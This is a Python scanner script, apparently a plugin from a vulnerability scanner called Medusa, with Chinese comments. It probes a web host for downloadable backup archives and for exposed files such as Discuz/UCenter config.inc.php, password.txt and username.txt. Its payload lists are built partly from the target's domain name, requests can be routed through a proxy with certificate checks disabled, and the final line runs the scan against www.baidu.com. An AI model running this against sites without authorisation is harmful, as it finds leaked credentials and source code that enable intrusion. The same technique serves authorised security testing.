#!/usr/bin/env python
# _*_ coding: utf-8 _*_

import urllib
import requests
import urllib3

urllib3.disable_warnings()

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

suffixs=[".zip",".rar",".tar.gz",".tgz",".7z"]
payloads=["/www.root",
         "/bbs",
         "/www",
         "/wwwroot",
         "/web",
         "/root",
         "/database",
         "/db",
         "/website",
         "//config/config_ucenter.php",
         "//config/config_global.php",
         "//uc/data/.config.inc.php",
         "//uc/data/config.inc.php",
         "//uc_server/data/.config.inc.php",
         "//uc_server/data/config.inc.php",
         "//ucenter/data/.config.inc.php",
         "//ucenter/data/config.inc.php",
         "/1",
         "/123",
         "/a",
         ]
SpecialPayload=["/root.txt",
                "/db.txt",
                "/password.txt",
                "/username.txt",
                "/database.txt"
                ]

def medusa(Url,RandomAgent,ProxyIp=None):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    Medusa = "{} 存在敏感文件压缩下载漏洞\r\n漏洞详情:\r\nPayload:".format(url)
    Medusas.append(str(Medusa))
    #构建特殊Payload并发送到SpecialPayload中
    colon_payload = ""
    unsigned_payload = ""
    point_payload = ""
    underline_payload = ""
    expansion_number_payload = ""
    url_str_list = url.split(".")
    for url_str in url_str_list:
        colon_payload = colon_payload + url_str + ":"
    for url_str in url_str_list:
        unsigned_payload = unsigned_payload + url_str
    for url_str in url_str_list:
        point_payload = point_payload + url_str + "."
    for url_str in url_str_list:
        underline_payload = underline_payload + url_str + "_"
    for url_str in url_str_list:
        expansion_number_payload = expansion_number_payload + url_str + "-"
    payloads.append(str("/"+colon_payload[:-1]))
    payloads.append(str("/"+unsigned_payload))
    payloads.append(str("/"+point_payload[:-1]))
    payloads.append(str("/"+underline_payload[:-1]))
    payloads.append(str("/"+expansion_number_payload[:-1]))

    for payload in payloads:
        for suffix in suffixs:
            try:
                payload_url = scheme+"://"+url+payload+suffix
                print(payload_url)
                headers = {
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept': '*/*',
                    'User-Agent': RandomAgent,
                }
                #s = requests.session()
                if ProxyIp!=None:
                    proxies = {
                        # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                        "http": "http://" + str(ProxyIp)
                    }
                    resp = requests.head(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
                elif ProxyIp==None:
                    resp = requests.head(payload_url,headers=headers, timeout=5, verify=False)
                con = resp.text
                code = resp.status_code
                if code==200:
                    Medusa="{}\r\n".format(payload_url)
                    Medusas.append(str(Medusa))
            except Exception as e:
                pass
    for Special in SpecialPayload:
        try:
            payload_url = scheme + "://" + url + Special
            print(payload_url)
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            # s = requests.session()
            if ProxyIp != None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.head(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp == None:
                resp = requests.head(payload_url, headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if code == 200:
                Medusa = "{}\r\n".format(payload_url)
                Medusas.append(str(Medusa))
        except Exception as e:
            pass


    try:
        for i in Medusas:
            Medusa=Medusa+i
        print(Medusa)
        return Medusas
    except:
        pass
medusa("www.baidu.com","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36")